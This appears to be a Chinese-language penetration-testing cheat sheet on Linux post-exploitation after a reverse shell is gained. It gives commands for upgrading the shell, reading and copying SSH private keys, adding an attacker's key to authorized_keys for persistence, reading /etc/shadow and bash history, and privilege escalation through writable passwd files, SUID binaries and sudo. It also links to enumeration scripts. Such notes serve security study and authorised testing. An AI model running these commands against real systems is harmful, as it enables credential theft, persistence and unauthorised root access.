#### 升级终端 (Upgrading the Shell)

在获得初始反向 Shell 后，通常需要将其升级为一个功能齐全的、交互式的 TTY 终端，以便使用 `Tab` 补全、`Ctrl+C` 等功能。

- **Python 方法**:
    
    Bash
    
    ```
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    
- **Perl 方法**:
    
    Bash
    
    ```
    perl -e 'exec "/bin/bash";'
    ```
    

#### 建立稳定的 SSH 访问 (Establishing Stable SSH Access)

##### 方法一：利用现有私钥 (Method 1: Use an Existing Private Key)

1. **查找私钥**: 检查当前用户的主目录下的 `.ssh` 文件夹，寻找 `id_rsa` 文件。
    
    Bash
    
    ```
    ls -la ~/.ssh
    cat ~/.ssh/id_rsa
    ```
    
2. **使用私钥**: 将私钥内容复制到你的攻击机上，保存为文件（例如 `target_key`），并设置正确的权限。
    
    Bash
    
    ```
    chmod 600 target_key
    ssh -i target_key user@<target_ip>
    ```
    

##### 方法二：添加自己的公钥 (Method 2: Add Your Own Public Key)

如果无法找到或读取现有私钥，可以添加自己的公钥以建立访问。

1. **生成密钥对**: 在你的攻击机上运行 `ssh-keygen`，会在 `~/.ssh/` 目录下生成 `id_rsa` (私钥) 和 `id_rsa.pub` (公钥)。
    
2. **添加公钥**: 复制你 `id_rsa.pub` 文件的**全部内容**，并将其追加到目标机器上 `~/.ssh/authorized_keys` 文件的末尾。
    
    Bash
    
    ```
    # 在目标机器上执行
    echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> ~/.ssh/authorized_keys
    ```
    

#### 基础信息收集 (Basic Information Gathering)

- **系统信息**: `uname -a` (打印内核版本、系统架构等)。
    
- **历史命令**: `cat ~/.bash_history` (查看用户历史执行的命令，可能包含密码或敏感信息)。
    
- **Shell 配置**: `cat ~/.bash_profile` 和 `cat ~/.bashrc` (可能包含自定义的别名、环境变量或脚本)。
    
- **Sudo 权限**:
    
    - `sudo -l`: 列出当前用户可以免密或以 root 身份执行的命令。
        
    - `sudo -V`: 检查 `sudo` 的版本号。版本低于 `1.8.28` 存在严重的本地提权漏洞 (CVE-2019-14287)。
        

#### 探索 `/etc` 目录 (Exploring the /etc Directory)

- **/etc/passwd**: `cat /etc/passwd` (列出系统上的所有本地用户和服务账户。如果对此文件有**写入权限**，可以直接添加一个 UID 为 0 的新用户来实现提权)。
    
- **/etc/shadow**: `cat /etc/shadow` (包含用户的密码哈希。如果对此文件有**读取权限**，可以尝试离线破解哈希；如果有**写入权限**，可以直接替换 root 用户的哈希)。
    
- **/etc/hosts**: `cat /etc/hosts` (可能暴露内部网络中其他主机的 IP 地址或域名)。
    

#### 查找敏感文件 (Finding Sensitive Files)

使用 `find` 命令在整个文件系统中搜索可能包含敏感信息的文件。

- **常见后缀**: `.log` (日志), `.conf` (配置), `.bak` (备份), `.sql` (数据库), `.yml` (配置文件)。
    
- **示例命令**:
    
    Bash
    
    ```
    find / -name "*.conf" 2>/dev/null
    find / -name "*.bak" 2>/dev/null
    ```
    
- **更多后缀**: [Linux 常见文件扩展名列表](https://lauraliparulo.altervista.org/most-common-linux-file-extensions/)
    

#### 枚举 SUID 文件 (Enumerating SUID Files)

设置了 SUID 权限位的可执行文件会以文件所有者（通常是 root）的身份运行。如果这类程序本身存在漏洞，就可能被用来提权。

1. **查找 SUID 文件**:
    
    Bash
    
    ```
    find / -perm -u=s -type f 2>/dev/null
    ```
    
2. **寻找利用方法**: 将找到的文件列表与 [GTFOBins](https://gtfobins.github.io/) 等提权数据库进行比对，查找已知的提权方法。
    

#### 枚举网络连接 (Enumerating Network Connections)

检查系统上的网络连接，可以发现系统正在监听的服务，或与其他内部主机的连接。

- **查看所有连接**: `netstat -at | less`
    
- **查看监听端口及对应程序**:
    
    Bash
    
    ```
    netstat -tulpn
    ```
    

#### 使用自动化枚举脚本 (Using Automated Enumeration Scripts)

为了提高效率，可以使用自动化的枚举脚本来一次性收集大量系统信息并高亮显示潜在的提权向量。

- **常用脚本**:
    
    - **Linpeas**: [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
        
    - **LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)